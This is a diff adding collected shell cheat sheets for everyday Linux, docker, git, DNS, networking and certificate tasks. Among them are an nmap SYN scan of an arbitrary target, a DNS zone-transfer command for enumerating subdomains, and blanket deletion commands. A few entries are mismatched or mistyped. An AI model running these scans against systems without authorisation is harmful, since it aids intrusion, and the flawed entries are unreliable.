+tar -xjvf <BzipTarFile>
+
+# Tar and zip a file or directory (recursively)
+tar -czvf <ArchiveName> <FileOrDirectory>
+
+# Better extraction solution (for unzip, bunzip, untar, etc.)
+dtrx <ZIPedFile>
+
+# Get a json output of all windows in the current i3-wm session
+i3-msg -t get_tree | jq
+
+# Shrink a video
+ffmpeg -i <InputFile> -r 30 -s 960x540 -strict -2 <OutputFile>
+
+# Create blurry background pictures from images in current dir
+mkdir blurrybackgrounds && for i in *.jpg *.JPG *.png *.PNG ; do out=$(uuidgen).jpg ; convert -quality 75 "$i" -strip -auto-orient -resize 4x4 -resize 1920x1080\! "blurrybackgrounds/${out}" ; done
+
+# Screenshot: Whole screen
+scrot
+
+# Screenshot: Focused window after X seconds
+scrot -f -d <seconds>
+
+# Screenshot: Select the part of the screen
+scrot -s
+
+# Screenshot: Select the part of the screen, then wait X seconds
+scrot -s -d <seconds>
+
+# Test download/upload network speeds
+speedtest-cli
+
+# Basic, good system info
+neofetch
+
+# Comprehensive system info
+inxi
+
+# Comprehensive battery information
+upower -d
+
+# Show disk usage and allow for deleting stuff
+ncdu
+
+# System monitor - improved "top"
+htop
+
+# System monitoring tool
+glances
+
+# Live system info
+saidar
+
+# Shows all systemd services (root to change status etc.)
+chkservice
+
+# Disk usage overview getting every device possible
+duf --all
+
+# Disk usage overview but disregard special devices
+duf -hide-special
+
+# Disk usage overview (see https://github.com/muesli/duf)
+duf
+
+# Interactive setup of displays
+arandr
+
+# Auto-setup displays
+xrandr --auto
+
+# Text to speech
+espeak
+
+# Ncurses spreadsheet
+sc
+
+# Ncurses git (must be launched from a git repo)
+tig
+
+# Reddit browser
+tuir
+
+
+==> misc__shell.cheat <==
+
+% Shell Usage 
+
+# Re-call last input with sudo
+sudo !!
+
+# Help
+help cd / help dir (...)
+
+# Finding Help
+apropos directory / apropos search (...)
+
+# Define custom startup screen
+sudo nano /etc/motd
+
+# Run a script as background process
+<process> &
+
+#List all running processes
+ps -A
+
+# Kill a running process
+killall <Process-name>
+
+% Shell System
+
+# Get the current path
+pwd
+
+# Get the current hostname
+hostname
+
+# Get the current users
+users
+
+# Show calendar
+cal
+
+# Show today's date
+date
+
+# Exit terminal
+exit
+
+% Shell Permissions
+
+# Use -R option to change permissions recursively.
+ps -ef | grep apache | grep -v grep
+
+# Change group
+chgrp <group-name-from> <group-name-to>
+
+% Shell Directories
+
+# List directory contents
+ls
+
+# List all directory contents
+ll
+
+# List all directory contents sorted by time edited
+ls -alt
+
+# List directory (wildcard matching)
+ls *.<txt>
+
+# List all files of type
+find . -name '*.<txt>' -print
+
+# Go back to previous directory
+cd -
+
+# Make (empty) directory
+mkdir <dirname>
+
+# Remove (empty) directory
+rmdir <dirname>
+
+# Remove directory with all contents without prompt
+rm -rf <dirname>
+
+# Remove directory contents and keep directory
+rm -rf *
+
+# Change directory
+cd <dirname>
+
+% shell Symlinks
+
+# Create symlink
+ln -s <source-dirname> <destination-dirname>
+
+# Update symlink
+ln -sfn <source-dirname> <destination-dirname>
+
+# Remove symlink
+unlink <sample-dirname>
+
+% Shell Files
+
+# Make (empty) file
+touch <filename-txt>
+
+# Duplicate file
+cp <filename> <file-copyname>
+
+# Copy/Page folder with content
+cp -a <old-folder>/ <new-folder>
+
+# Move/Rename file
+mv <current-filename-path> <new-filename-path>
+
+# Move/Rename file and prompt before overwriting an existing file
+mv -i <current-filename> <new-filename>
+
+# Remove file
+rm <filename-txt>
+
+# Write to file (will overwrite existing content)
+cat > <filename-txt> 
+
+# Search for a filename-(not content!) in the current directory
+find <filename-txt>
+
+# Search for a string inside all files in the current directory and subdrectories
+grep -r <string> *
+
+# Search and replace within file
+sed -i s/<original-text>/<new-text>/g <filename-txt>
+
+# MD5 hash for files
+md5 <filename-txt>
+
+# MD5 hash for folders
+tar c <folder> | md5sum
+
+# Encrypt file
+openssl enc -aes-256-cbc -e -in <sample-filename-txt> -out <sample-encrypted-txt>
+
+# Decrypt file
+openssl enc -aes-256-cbc -d -in <sample-encrypted> -out <sample-filename>
+
+% Shell Server
+
+# Access via ssh
+ssh <username_remote>
+
+# Copy file from server to local
+scp <username_remote>:<file-to-send-path> <path-to-recieve> 
+
+# Copy file from local to server
+scp <file-to-send> <username_remote>:<where-to-put>
+
+# Escape files with spaces in name like this
+<path-to-file>\\\ <name-png>
+
+$ username_remote: cat ~/.ssh/config | grep -i "host "|sed 's/^[ \t]*//g' | awk '{print $2}'
+
+% Shell System
+
+# Show disc space
+df -h
+
+# Show disc space (inodes)
+df -i
+
+# Show disc space for current directory
+du -hs
+
+# Current processes (also CPS usage)
+top or htop
+
+# Show running php processes
+ps aux | grep php
+
+# Monitor error log (stream as file grows)
+tail error.log -f -n 0
+
+% Shell Apps
+
+# Start appliction
+xdg-open <programme> 
+
+# Open finder with current folder
+open .
+
+% Shell Variables
+
+# Register variable
+export <TESTING>=<Variable-text>
+
+# Echo variable
+echo $<Variable>
+
+# Unset variable
+unset <Variable>
+
+% Shell Output & Redirects
+
+# Write to file
+echo <Hello> > <hello-txt>
+
+# Append content from a file to another file
+cat <file1-txt> >> <file2-txt>
+
+# Add the amount of lines, words, and characters to <file2-txt>
+cat <file1-txt> | <word-count> | cat > <file2-txt>
+
+# Sort the content of a file (like cat)
+sort <hello-txt>
+
+# Save to sorted content to a new file
+cat <file1-txt> | sort > <sorted-file1-txt>
+
+# Sort and remove duplicates and save to a new file
+sort <file1-txt> | uniq > <uniq-file1-txt>
+
+==> navi__cheats__clipboard.cheat <==
+% clipboard
+
+# Replace line breaks by \n
+dot script clip paste | sed ':a;N;$!ba;s/\n/\\n/g' | dot script clip copy
+
+# Convert uppercase to lowercase
+pbpaste | tr '[:upper:]' '[:lower:]' | pbcopy
+
+# Convert lowercase to uppercase
+pbpaste | tr '[:lower:]' '[:upper:]'  | pbcopy
+==> navi__cheats__docker.cheat <==
+% docker
+
+# Remove an image
+docker image rm <image_id>
+
+# Remove an image from the local image store
+docker rmi <image_id>
+
+# Remove all images from the local image store
+docker images -q | xargs -I% docker rmi "%" --force
+
+# Remove all containers
+docker ps -aq | xargs -I% docker rm "%"
+
+# Stop all containers
+docker ps -aq | xargs -I% docker stop "%"
+
+# List all images that are locally stored with the Docker engine
+docker images
+
+# Build an image from the Dockerfile in the current directory and tag the image
+docker build -t <image>:<version> .
+
+# Pull an image from a registry
+docker pull <image>:<version>
+
+# Stop a running container through SIGTERM
+docker stop <container_id>
+
+# Stop a running container through SIGKILL
+docker kill <container_id>
+
+# List the networks
+docker network ls
+
+# List the running containers
+docker ps
+
+# Delete all running and stopped containers
+docker ps -aq | xargs -I% docker rm -f "%"
+
+# Create a new bash process inside the container and connect it to the terminal
+docker exec -it <container_id> bash
+
+# Print the last lines of a container's logs
+docker logs --tail 100 <container_id> | less
+
+# Print the last lines of a container's logs and following its logs
+docker logs --tail 100 <container_id> -f
+
+# Create new network
+docker network create <network_name>
+
+$ image_id: docker images --- --headers 1 --column 3 --delimiter '\s\s+'
+$ container_id: docker ps --- --headers 1 --column 1 --delimiter '\s\s+'
+
+% docker-compose
+
+# Builds, (re)creates, starts, and attaches to containers for all services
+docker-compose up
+
+# Builds, (re)creates, starts, and dettaches to containers for all services
+docker-compose up -d
+
+# Builds, (re)creates, starts, and attaches to containers for a service
+docker-compose up -d <service_name>
+
+# Builds, (re)creates, starts, and dettaches to containers for a service
+docker-compose up -d <service_name>
+
+# Print the last lines of a service’s logs
+docker-compose logs --tail 100 <service_name> | less
+
+# Print the last lines of a service's logs and following its logs
+docker-compose logs -f --tail 100 <service_name>
+
+# Stops containers and removes containers, networks created by up
+docker-compose down
+
+
+% docker, boot
+
+# Prevent all containers from autostarting on boot
+docker update --restart=no $(docker ps -a -q)
+==> navi__cheats__filesystem.cheat <==
+% fs, filesystem
+
+# Delete all broken symlinks
+find -L . -name . -o -type d -prune -o -type l -exec rm {} +
+
+# Delete all .DS_Store files
+find . -name ".DS_Store" -type f -delete
+
+# Delete empty directories
+find . -type d -empty -delete
+
+# Folder size
+du -sh
+
+# Edit fre entries
+e "${HOME}/Library/Application Support/fre/fre.json"
+
+==> navi__cheats__git.cheat <==
+% git common
+; raycast.icon: bank-note-16
+
+$ local_branch: dot git ls local_branch --- --column 1
+$ config: dot git ls config --- --column 1
+$ stash: dot git ls stash --- --column 1
+$ commit: dot git ls commit --- --column 1
+$ toplevel_dir: dot git ls toplevel_dir
+$ file: dot git ls file --- --column 1 --preview-window 'right:50%' --preview 'bat -p --color=always {}'
+$ files: dot git ls file --- --multi --column 1 --preview-window 'right:50%' --preview 'bat -p --color=always {}'
+$ modified_file: dot git ls file -m --- --column 1 --preview-window 'right:50%' --preview 'bat -p --color=always {}'
+$ modified_files: dot git ls file -m --- --multi --column 1 --preview-window 'right:50%' --preview 'bat -p --color=always {}'
+$ tag: dot git ls tag --- --column 1
+$ upstream_branch: dot git branch upstream
+$ modified_files_upstream: git diff --name-only "<upstream_branch>" --- --multi --preview 'bat -p --color=always {}' --map "sed -e 's/^.*$/\"&\"/' | tr '\n' ' '"
+
+% git branch
+@ git common
+
+# checkout branch
+git checkout "<local_branch>"
+
+# checkout tag
+git checkout "<tag>"
+
+# set upstream
+git branch —set-upstream-to "<local_branch>"
+
+% git config
+@ git common
+
+# print config value
+git config "<config>"
+
+% git view
+@ git common
+
+# view
+bat --color=always "<file>"
+
+% git add
+@ git common
+
+# add files
+cd "<toplevel_dir>"
+files=($(echo "<modified_files>"))
+git add "${files[@]}"
+git status
+
+% git misc
+@ git common
+
+# revert (checkout) files to upstream version
+for f in <modified_files_upstream>; do git checkout "<upstream_branch>" "$f"; done
+==> navi__cheats__network.cheat <==
+% network
+
+# Kill a process running on a given port
+lsof -i :<port> \
+   | awk '{l=$2} END {print l}' \
+   | xargs kill
+
+# Kill a process using a port given a name
+port="$(echo "<process>" | grep -Eo ':([0-9][0-9][0-9]+) ' | tr -d ':')"
+lsof -i :$port \
+   | awk '{l=$2} END {print l}' \
+   | xargs kill
+
+# List IP addresses connected on a given port
+netstat -tn 2>/dev/null \
+   | grep :<port> \
+   | awk '{print $5}' \
+   | cut -d: -f1 \
+   | sort \
+   | uniq -c \
+   | sort -nr \
+   | head
+
+# Find external, public IP address
+dig +short myip.opendns.com @resolver1.opendns.com
+
+# Find primary, local IP address
+ifconfig \
+  | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' \
+  | grep -Eo '([0-9]*\.){3}[0-9]*' \
+  | grep -v '127.0.0.1' \
+  | tail -n1
+
+# Geolocation data given an IP
+curl -sL "ipinfo.io/<ip>" | jq
+
+# Geolocation data for own IP
+curl -sL "ipinfo.io/<self_global_ip>" | jq
+
+# Launch a container with network utils
+docker run -it --entrypoint /bin/sh nicolaka/netshoot
+
+# Map ports
+sudo nmap -sS -sV -0 "<target>"
+
+# Find process using a port
+lsof -n -i4TCP:<port> | grep LISTEN
+
+# List open ports
+lsof -Pn -i4
+
+# Start a Python3 server
+python3 -m http.server
+
+$ self_global_ip: dig +short myip.opendns.com @resolver1.opendns.com
+$ process: lsof -iTCP -sTCP:LISTEN -n -P | sed -E "s/:([0-9][0-9][0-9]+) /:$(tput setaf 3)\1$(tput sgr0) /g" --- --header-lines 1
+==> navi__cheats__process.cheat <==
+% process
+
+# Kill with signal 9
+sudo kill -9 <pid>
+
+# Kill with signal <n>
+sudo kill -<n> <pid>
+
+# Limit CPU usage to <n>%
+cpulimit --include-children --limit <n> --pid <pid>
+
+# Stop limiting CPU
+pkill -f cpulimit.*<pid>
+
+# Lower priority by <n>
+renice -n <n> -p <pid>
+
+# Unfreeze process
+kill -CONT <pid>
+
+$ pid: (ps -o pid,%cpu,%mem,ni,cmd ax 2>/dev/null || ps -o pid,%cpu,%mem,ni,command) | sort -b -k3 -r | awk '{print $1, $2, $3, $4, $5}' | column -t --- --header-lines 1 --column 1
+==> navi__cheats__shell.cheat <==
+% shell
+
+# Copy environment variable to clipboard
+echo "<env_var_value>" | dot script clip copy
+
+# List path available commands
+which "<cmd>"
+
+$ cmd: bash -c "compgen -c" | sort -u
+$ env_var_value: echo -e "variable@value\n$(env)" | sed 's/=/@/' | column -t -s'@' -c2 --- --column 2 --header-lines 1
+==> navi__cheats__tmp.cheat <==
+% examples
+
+# Simple echo
+echo foo bar
+
+# Display contents of a file
+cat <file>
+
+# Echo text
+echo <some_text>
+
+$file: ls
+
+
+# Send WhatsApp message to phone number
+open 'https://web.whatsapp.com/send?phone=<phone>'
+
+
+% tmp
+
+# Echo multiline
+echo -e "<foo>\nlorem ipsum\n<bar>"
+
+$ foo: ls
+$ bar: ls
+
+% rg, grep
+
+# search 1
+rg <opts1> <pattern> <path>
+
+# search 2
+rg <opts2> <pattern> <path>
+
+# make install path
+echo make DESTDIR=<dst> install
+
+$ dst: echo "$HOME" --- --fzf-overrides '--no-select-1'
+$ opts1: echo -e 'option;description\n--column;show column numbers\n-l;print filenames with maches\n--files-without-match;print filenames without matches' | column -t -s';' --- --column 1 --header-lines 1 --multi --map "tr '\n' ' '"
+$ opts2: echo -e 'option;description\n--column;show column numbers\n-l;print filenames with maches\n--files-without-match;print filenames without matches' | column -t -s';' --- --column 1 --header-lines 1 --multi --map "tr c f"
+
+% slow
+
+# Slow command
+echo <a> <b>
+
+$ a: printf 'Loading...' >&2; sleep 2; printf '%b' '\r\033[2K' >&2; echo "a c" | tr ' ' '\n'
+$ b: sleep 2 && echo "b d" | tr ' ' '\n'
+
+% table
+
+# my make command
+echo make <cfg>
+
+$ cfg: for x in 1 2 3; do \
+   for y in a b c; do \
+      echo "$x $y"; \
+   done; \
+  done \
+  --- --expand --prevent-extra
+
+% shell
+
+# env
+cat ${HOME}/dotfiles/shell/bash/bashrc | wc
+echoerr foo
+
+% err
+
+# check for error
+log="<log>"
+if [ -n "$log" ]; then
+   echo "my git log has <words> words"
+else
+   echo "failed to get git log"
+fi
+
+$ log: echo "foo bar"
+$ words: echo "$log" | wc -w | xargs
+
+
+% empty
+
+# empty test
+tar -xf <file>
+
+$ file: ls *.tar
+
+% default
+
+# default test
+echo "<n>"
+
+$ n: echo -e "16\n"
+
+% src
+
+# This will output "foo\nyes"
+echo foo
+true \
+    && echo yes `# comment 1` \
+    || echo no `# comment 2`
+
+# echoerr
+source "${HOME}/dotfiles/shell/aux/core.bash"
+echoerr foo
+
+% headphone, sound
+
+# play a sound
+afplay "/Applications/Slack.app/Contents/Resources/b2.mp3"
+
+==> network__curl.cheat <==
+% curl, http
+
+# send a get http request
+curl <url>
+
+# send a http request
+curl -X <method> <url>
+
+# send a http request and write the output to a file
+curl -X <method> <url> -o <filename>
+
+# send a get http request and follow redirects
+curl -L <url>
+
+# send a get http request exit with a non-zero status code on failure
+curl --fail <url>
+
+# send an authenticated http request
+curl -u <username>:<password> -X <method> <url>
+
+# send a http request with a json body
+curl -X <method> <url>  -H 'Content-Type: application/json' -d '<json>'
+
+# send a http request with a form body
+curl <url> -d <bodykey>=<bodyvalue>
+
+# send a http request and see the request as well as the response
+curl -v <url>
+
+# send a http request with a body from a file
+curl -X <method> <url> --data-binary "@<file>"
+
+# send a http request with a custom header
+curl -X <method> <url> -H "<headername>: <headervalue>"
+
+$ file: ls
+$ method: echo -e 'GET\nPOST\nPUT\nDELETE\nPATCH'
+
+==> networking__dig.cheat <==
+% dnsm networking
+
+# Query Specific Name Server
+
+dig @<dns_Server_v4> <fqdn>
+
+$ dns_server_v4: echo -e "8.8.8.8\n "
+$ dns_server_v6: echo -e "2001:4860:4860::8888\n "
+
+# Search For Record Type
+
+dig @<dns_Server> <fqdn> <dns_record_type>
+
+$ dns_record_type: echo -e "ALL\nA\nMX\nTXT\n "
+
+# Reverse DNS Lookup
+
+dig -x <ip_address>
+
+# Trace DNS Path
+
+dig <fqdn> +trace
+
+# Adjust Answer Size of dig
+
+dig <fqdn> +short
+
+# Lookup From File
+
+dig -f <dns_query_file> +short
+
+# Specify Port Number
+
+dig @<dns_Server_v4> -p <port> <fqdn>
+
+# Use IPv4 Or IPv6
+
+dig -6 @<dns_Server_v6> <fqdn> <dns_record_type>
+
+# Query All DNS Record Types
+
+dig <fqdn> ANY
+
+# Customize Dig Output - Hide All
+
+dig <fqdn> +noall
+
+# Customize Dig Output - Print Statistics
+
+dig <fqdn> +noall +stats
+
+# Customize Dig Output - Print Answer
+
+dig <fqdn> +noall +answer
+
+# Get a list of all subdomains of a domain
+
+dig @<dns_Server_v4 <fqdn> axfr
+
+# Adjust Defaults With ~/.digrc File
+
+cat ~/.digrc
+
+# TCP mode
+
+dig <fqdn> +[no]vc
+
+# TCP mode, alternate syntax
+
+dig <fqdn> +[no]tcp
+
+# Set query timeout [5]
+
+dig <fqdn> +time=<query_time>
+
+# Set number of UDP attempts [3]
+
+dig <fqdn> +tries=<query_tries>
+
+# Set number of UDP retries [2]
+
+dig <fqdn> +retry=<query_retries>
+
+# Set default domainname
+
+dig <fqdn> +domain=<domain_name>
+
+# Set EDNS0 Max UDP packet size
+
+dig <fqdn> +bufsize=<bufsize>
+
+# Set NDOTS value
+
+dig <fqdn> +ndots=<ndots>
+
+# Set EDNS version
+
+dig <fqdn> +edns=<edns_version>
+
+# Set whether to use searchlist
+
+dig <fqdn> +[no]search
+
+# Search with intermediate results
+
+dig <fqdn> +[no]showsearch
+
+# Ditto
+
+dig <fqdn> +[no]defname
+
+# Recursive mode
+
+dig <fqdn> +[no]recurse
+
+# Don’t revert to TCP for TC responses.
+
+dig <fqdn> +[no]ignore
+
+# Don’t try next server on SERVFAIL
+
+dig <fqdn> +[no]fail
+
+# Try to parse even illegal messages
+
+dig <fqdn> +[no]besteffort
+
+# Set AA flag in query dig <fqdn> +[no]aaflag
+
+dig <fqdn> +[no]aaonly
+
+# Set AD flag in query
+
+dig <fqdn> +[no]adflag
+
+# Set CD flag in query
+
+dig <fqdn> +[no]cdflag
+
+# Control display of class in records
+
+dig <fqdn> +[no]cl
+
+# Control display of command line
+
+dig <fqdn> +[no]cmd
+
+# Control display of comment lines
+
+dig <fqdn> +[no]comments
+
+# Control display of question
+
+dig <fqdn> +[no]question
+
+# Control display of answer
+
+dig <fqdn> +[no]answer
+
+# Control display of authority
+
+dig <fqdn> +[no]authority
+
+# Control display of additional
+
+dig <fqdn> +[no]additional
+
+# Control display of statistics
+
+dig <fqdn> +[no]stats
+
+# Disable everything except shortform of answer
+
+dig <fqdn> +[no]short
+
+# Control display of ttls in records
+
+dig <fqdn> +[no]ttlid
+
+# Set or clear all display flags
+
+dig <fqdn> +[no]all
+
+# Print question before sending
+
+dig <fqdn> +[no]qr
+
+# Search all authoritative nameservers
+
+dig <fqdn> +[no]nssearch
+
+# ID responders in short answers
+
+dig <fqdn> +[no]identify
+
+# Trace delegation down from root
+
+dig <fqdn> +[no]trace
+
+# Request DNSSEC records
+
+dig <fqdn> +[no]dnssec
+
+# Request Name Server ID
+
+dig <fqdn> +[no]nsid
+
+# Print records in an expanded format
+
+dig <fqdn> +[no]multiline
+
+# AXFR prints only one soa record
+
+dig <fqdn> +[no]onesoa
+==> networking__ss.cheat <==
+% ss, socket statistics, network
+
+# Summary of socket connections (all connections, show port and service number, incl. process names)
+ss -plants
+
+# Show TCP/UDP and related process
+ss -plunt
+
+# close active connections. It works for IPv4 and IPv6 and can be used with the --kill option. Typically you want to combine this with a specific IP address and optionally a port.
+ss --kill dst <ip address> dport = <port>
+
+# monitor connections ( see the amount of traffic and great for monitoring or when to do system maintenance)
+ss -n --events
+
+# open connections on a port
+ss -nt sport = :<port>
+
+# Query multiple ports
+ss -nt '( sport = :<port 1> or sport = :<port 2> )'
+
+# Connection by defining the side ‘src’ (source) or ‘dst’ (destination)
+
+ss -nt '( src :<port 1> or src :<port 2> )'
+==> networking__ssh.cheat <==
+% ssh
+
+# See the available SSH keys in the OpenSSH authentication agent
+ssh-add -l
+==> networking__ssl.cheat <==
+% openssl, ssl, networking
+
+# Show expiration date of SSL certificates
+echo | openssl s_client -connect <domain>:<port> 2>/dev/null |openssl x509 -dates -noout
+
+$ port: echo -e "443\n "
+
+# Making and trusting your own certificates
+openssl req -x509 -out <localdomain>>.crt -keyout <localdomain>.key \
+  -newkey rsa:2048 -nodes -sha256 \
+  -subj "/CN=<localdomain>" -extensions EXT -config <( \
+   printf "[dn]\nCN=<localdomain>\n[req]\ndistinguished_name = dn\n[EXT]\nsubjectAltName=DNS:<localdomain>\nkeyUsage=digitalSignature\nextendedKeyUsage=serverAuth")
+==> obsidian.cheat <==
+% obsidian, obsidian-cli
+
+# Defines default vault for future usage. If not set, pass --vault flag for other commands. You don't provide the path to vault here, just the name.
+obs set-default "{vault-name}"
+
+# Prints default vault and path. Please set this with set-default command if not set.
+obs print-default
+
+# Opens note in obsidian
+obs open "{note-name}"
+
+# Opens note in specified obsidian
+obs open "{note-name}" --vault "{vault-name}"
+
+# Searches in default obsidian
+obs search "{search-text}"
+
+# Searches in specified obsidian
+obs search "{search-text}" --vault "{vault-name}"
+
+# Creates empty note in default obsidian and opens it
+obs create "{note-name}"
+
+# Creates empty note in given obsidian and opens it
+obs create "{note-name}"  --vault "{vault-name}"
+
+# Creates note in default obsidian with content
+obs create "{note-name}" --content "abcde"
+
+# Creates note in default obsidian with content - overwrite existing note
+obs create "{note-name}" --content "abcde" --overwrite
+
+# Creates note in default obsidian with content - append existing note
+obs create "{note-name}" --content "abcde" --append
+
+# Creates note and opens it
+obs create "{note-name}" --content "abcde" --open
+
+# Renames a note in default obsidian
+obs move "{current-note-path}" "{new-note-path}"
+
+# Renames a note and given obsidian
+obs move "{current-note-path}" "{new-note-path}" --vault "{vault-name}"
+
+# Renames a note in default obsidian and opens it
+obs move "{current-note-path}" "{new-note-path}" --open
+
+# Renames a note in default obsidian
+obs delete "{note-path}" 
+
+# Renames a note in given obsidian
+obs delete "{note-path}" --vault "{vault-name}"
+
+==> openssl.cheat <==
+% openssl
+
+# Download certificat from server
+echo | \
+openssl s_client -servername <DOMAIN> -connect <DOMAIN>:443 2>/dev/null | \
+openssl x509 -text | \
+less
+
+
+==> rsync.cheat <==
+% rsync
+
+# files from server (accepts * and regular expressions)
+rsync -avzPs '<user>@<server>:<folder>/*' .
+
+# files from server with special port (accepts * and regular expressions)
+rsync -e 'ssh -p <port>' -avzPs '<user>@<server>:<folder>/*' .
+
+# files from server with special port and special key (accepts * and regular expressions)
+rsync -e 'ssh -p <port> -i <sshkey>' -avzPs '<user>@<server>:<folder>/*' .
+
+# files from server with special key (accepts * and regular expressions)
+rsync -e 'ssh -i <sshkey>' -avzPs '<user>@<server>:<folder>/*' .
+
+$ user : echo -e "$(whoami)\nroot"
+$ sshkey : ls ~/.ssh | grep -v known_hosts | grep -v config
+$ server : cat /etc/hosts | cut -f2 -d' '
+
+==> rust__packages.cheat <==
+% rust packages, utilities, cli, shell, package manager, updates
+
+# Update all currently installed cargo packages
+
+cargo install-update --all
+
+==> security__gpg.cheat <==
+% gpg
+
+# gpg version
+gpg --version
+
+# gpg generate key
+gpg --gen-key
+
+# list keys
+gpg --list-keys
+
+# distribute public key to key server
+gpg --keyserver <key_server> --send-keys <public_key>
+
+# export public key
+gpg --output <filename_gpg> --export <key_name>
+
+# import public key
+gpg --import <filename_gpg>
+
+# encrypt document
+gpg --output <output_filename_gpg> --encrypt --recipient <public_key> <input_filename>
+
+# decrypt document
+gpg --output <filename> --decrypt <filename_gpg>
+
+# make a signature
+gpg --output <filename_sig> --sign <filename>
+
+# verify signature
+gpg --output <filename> <filename> --decrypt <filename_sig>
+
+# clearsign documents
+gpg --clearsign <filename>
+
+# detach signature
+gpg --output <filename_sig> --detach-sig <filename>
+
+==> security__keytool.cheat <==
+% java keytool, certificate, encryption
+
+## Creating
+# Generate a Java keystore and key pair
+keytool -genkey -alias <ALIAS> -keyalg RSA -keystore <OUTPUT_JKS> -keysize <RSA_LENGTH>
+
+# Generate a certificate signing request (CSR) for an existing Java keystore
+keytool -certreq -alias <ALIAS> -keystore <INPUT_JKS> -file <OUTPUT_CSR>
+
+# Import a root or intermediate CA certificate to an existing Java keystore
+keytool -import -trustcacerts -alias root -file <INPUT_CRT> -keystore <INPUT_JKS>
+
+# Import a signed primary certificate to an existing Java keystore
+keytool -import -trustcacerts -alias <ALIAS> -file <INPUT_CRT> -keystore <INPUT_JKS>
+
+# Generate a keystore and self-signed certificate
+keytool -genkey -keyalg RSA -alias <ALIAS> -keystore <OUTPUT_JKS> -storepass <PASSWORD> -validity <VALIDITY> -keysize <RSA_LENGTH>
+
+
+
+## Verifying
+# Check a stand-alone certificate
+keytool -printcert -v -file <INPUT_CRT>
+
+# Check which certificates are in a Java keystore
+keytool -list -v -keystore <INPUT_JKS>
+
+# Check a particular keystore entry using an alias
+keytool -list -v -keystore <INPUT_JKS> -alias <ALIAS>
+
+
+
+## Other
+# Remove a certificate from a keystore
+keytool -delete -alias <ALIAS> -keystore <INPUT_JKS>
+
+# Change the password of a keystore
+keytool -storepasswd -keystore <INPUT_JKS> -new <NEW_PASSWORD>
+
+# Export a certificate from a keystore
+keytool -export -alias <ALIAS> -file <OUTPUT_CRT> -keystore <INPUT_JKS>
+
+# List the trusted CA Certs from the default Java Trusted Certs Keystore
+keytool -list -v -keystore $JAVA_HOME/jre/lib/security/cacerts
+
+# Import New Certificate Authority into the default Java Trusted Certs Keystore
+keytool -import -trustcacerts -file <INPUT_PEM> -alias <ALIAS> -keystore $JAVA_HOME/jre/lib/security/cacerts
+
+
+
+# Sensible/common default alternatives
+$ VALIDITY: printf "DAYS\tCOMMENT\n1\ta day\n30\ta month\n365\ta year\n730\ttwo years" --- --column 1 --headers 1
+$ RSA_LENGTH: printf "KEY LENGTH\tCOMMENT\n2048\t\tDefault\n4096\t\tBetter\n8192\t\tSlow?" --- --column 1 --headers 1
+
+# Attempt to find files with the appropriate endings, default to everything.
+$ INPUT_CRT:    ls -a | grep -e "\(.crt\|.cer\|.der\)" || ls -a
+$ INPUT_PEM:    ls -a | grep -e "\(.pem\)"             || ls -a
+$ INPUT_JKS:    ls -a | grep -e "\(.jks\)"             || ls -a
+
+==> security__openssl.cheat <==
+% openssl, certificate, encryption
+
+## General OpenSSL Commands
+# Create a new signing request and key
+openssl req -new -newkey rsa:<RSA_LENGTH> -nodes -out <OUTPUT_CSR> -keyout <OUTPUT_KEY>
+
+# Create a new self-signed certificate
+openssl req -x509 -sha256 -nodes -days <VALIDITY> -newkey rsa:<RSA_LENGTH> -out <OUTPUT_CRT> -keyout <OUTPUT_KEY>
+
+# Create a signing request from existing key
+openssl req -out <OUTPUT_CSR> -key <INPUT_KEY> -new
+
+# Create a signing request from existing certificate and key
+openssl x509 -x509toreq -out <OUTPUT_CSR> -in <INPUT_CRT> -signkey <INPUT_KEY>
+
+# Remove a passphrase from a private key
+openssl rsa -in <INPUT_KEY> -out <OUTPUT_PLAINTEXT_KEY>
+
+
+
+## Converting between the different encoding
+# Convert a DER encoded file to a PEM encoded file
+openssl x509 -inform der -in <INPUT_CRT> -out <OUTPUT_PEM>
+
+# Convert a PEM encoded file to a DER encoded file
+openssl x509 -outform der -in <INPUT_PEM> -out <OUTPUT_CRT>
+
+# Convert a PKCS12 encoded file containing a private key and certificates to PEM
+openssl pkcs12 -in <INPUT_PKCS12> -out <OUTPUT_PEM> -nodes
+
+# Extract the private key from a PKCS12 encoded file
+openssl pkcs12 -in <INPUT_PKCS12> -out <OUTPUT_PEM> -nodes -nocerts
+
+# Extract the certificate from a PKCS12 encoded file
+openssl pkcs12 -in <INPUT_PKCS12> -out <OUTPUT_PEM> -nodes -nokeys
+
+# Convert a PEM certificate file and a private key to PKCS12 encoded file
+openssl pkcs12 -export -out <OUTPUT_PKCS12> -inkey <INPUT_KEY> -in <INPUT_CRT> -certfile <INPUT_CRT>
+
+
+
+## Validating certificates and keys using OpenSSL
+# Validate a certificate signing request
+openssl req -text -noout -verify -in <OUTPUT_CSR>
+
+# Validate a private key
+openssl rsa -in <INPUT_KEY> -check
+
+# Validate a certificate
+openssl x509 -in <INPUT_CRT> -text -noout
+
+# Validate a PKCS12 file (.pfx or .p12)
+openssl pkcs12 -info -in <INPUT_PKCS12>
+
+
+
+## Debugging using OpenSSL
+# Compare the MD5 hash of a certificate
+openssl x509 -noout -modulus -in <INPUT_CRT> | openssl md5
+
+# Compare the MD5 hash of a private key
+openssl rsa -noout -modulus -in <INPUT_KEY> | openssl md5
+
+# Compare the MD5 hash of a certificate signing request
+openssl req -noout -modulus -in <INPUT_CSR> | openssl md5
+
+# Display the server certificate chain
+openssl s_client -connect <URL>:<PORT>
+
+
+
+# Sensible/common default alternatives
+$ VALIDITY: printf "DAYS\tCOMMENT\n1\ta day\n30\ta month\n365\ta year\n730\ttwo years" --- --column 1 --headers 1
+$ RSA_LENGTH: printf "KEY LENGTH\tCOMMENT\n2048\t\tDefault\n4096\t\tBetter\n8192\t\tSlow?" --- --column 1 --headers 1
+
+# Attempt to find files with the appropriate endings, default to everything.
+$ INPUT_PKCS12: ls -a | grep -e "\(.pfx\|.p12\)"       || ls -a
+$ INPUT_CSR:    ls -a | grep -e "\(.csr\)"             || ls -a
+$ INPUT_KEY:    ls -a | grep -e "\(.key\|.pem\)"       || ls -a
+$ INPUT_CRT:    ls -a | grep -e "\(.crt\|.cer\|.der\)" || ls -a
+$ INPUT_PEM:    ls -a | grep -e "\(.pem\)"             || ls -a
+
+==> security__ssh.cheat <==
+% ssh
+
+# Start ssh agent
+eval "$(ssh-agent -s)"; ssh-add
+
+==> shell__colors.cheat <==
+% ansi terminal colors, bash, shell, cli
+
+# Ansi tput syntax for reset
+
+RESET=$'\033[0m'
+
+# Ansi tput method for Foreground Black
+
+$(tput setaf 0)
+
+# Ansi tput method for Foreground Light Black
+
+$(tput setaf 8)
+
+# Ansi tput method for Foreground Red
+
